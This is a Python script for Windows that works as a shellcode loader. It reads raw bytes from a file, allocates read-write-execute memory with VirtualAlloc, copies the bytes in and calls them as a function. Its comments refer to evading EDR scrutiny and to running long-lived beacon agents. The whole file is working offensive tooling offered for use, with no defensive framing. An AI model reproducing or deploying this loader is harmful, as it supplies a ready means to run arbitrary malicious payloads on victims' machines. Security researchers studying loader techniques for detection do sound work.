import sys
import ctypes
from ctypes import wintypes

# Define necessary Windows types for 64-bit compatibility
# This ensures pointers and sizes are handled correctly.
wintypes.LPVOID = ctypes.c_void_p
wintypes.HANDLE = ctypes.c_void_p
wintypes.DWORD = ctypes.c_ulong
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.BOOL = ctypes.c_int
wintypes.SIZE_T = ctypes.c_size_t

# Define constants for memory allocation and protection
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000
PAGE_EXECUTE_READWRITE = 0x40

# Get a handle to kernel32.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define the function prototypes for the Windows APIs we will use.
# This is CRITICAL for 64-bit execution to prevent pointer truncation.

# VirtualAlloc
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAlloc.restype = wintypes.LPVOID

# VirtualFree
# https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
VirtualFree = kernel32.VirtualFree
VirtualFree.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD]
VirtualFree.restype = wintypes.BOOL

def main():
    """
    Reads shellcode from a file, allocates executable memory,
    copies the shellcode, and executes it.
    """
    # Ensure a file path is provided as a command-line argument
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <path_to_shellcode_bin>")
        sys.exit(1)

    shellcode_path = sys.argv[1]
    
    try:
        with open(shellcode_path, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"Error: File not found at '{shellcode_path}'")
        sys.exit(1)
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
        sys.exit(1)

    if not shellcode:
        print("Error: Shellcode file is empty.")
        sys.exit(1)
        
    shellcode_size = len(shellcode)

    # 1. Allocate a memory buffer for the shellcode with RWX permissions
    # Using PAGE_EXECUTE_READWRITE is simple but highly suspicious to EDRs.
    mem_buffer = VirtualAlloc(
        None,                   # Let the system decide the address
        shellcode_size,         # Size of the allocation
        MEM_COMMIT | MEM_RESERVE, # Allocate and commit memory
        PAGE_EXECUTE_READWRITE  # Set permissions to Read, Write, and Execute
    )

    if not mem_buffer:
        error_code = ctypes.get_last_error()
        print(f"Failed to allocate memory. Error code: {error_code}")
        sys.exit(1)
        
    # Cast the allocated memory address to a void pointer for compatibility
    mem_buffer_ptr = ctypes.c_void_p(mem_buffer)

    # 2. Copy the shellcode into the allocated buffer
    # ctypes.memmove is used for copying bytes between memory locations.
    ctypes.memmove(mem_buffer_ptr, shellcode, shellcode_size)

    # 3. Create a function pointer to the shellcode in memory
    # CFUNCTYPE defines the function signature: no return value (None) and no arguments.
    shellcode_func = ctypes.CFUNCTYPE(None)(mem_buffer)

    # 4. Execute the shellcode
    print("Executing shellcode...")
    try:
        shellcode_func()
    except Exception as e:
        # This may or may not be reached depending on the shellcode's behavior
        print(f"Shellcode execution finished or raised an exception: {e}")

    # 5. Clean up the allocated memory
    # Note: If the shellcode is a long-running agent (like a beacon),
    # this part of the code might not be reached.
    print("Releasing memory...")
    if not VirtualFree(mem_buffer_ptr, 0, MEM_RELEASE):
        error_code = ctypes.get_last_error()
        print(f"Failed to free memory. Error code: {error_code}")
    else:
        print("Memory successfully released.")

if __name__ == "__main__":
    main()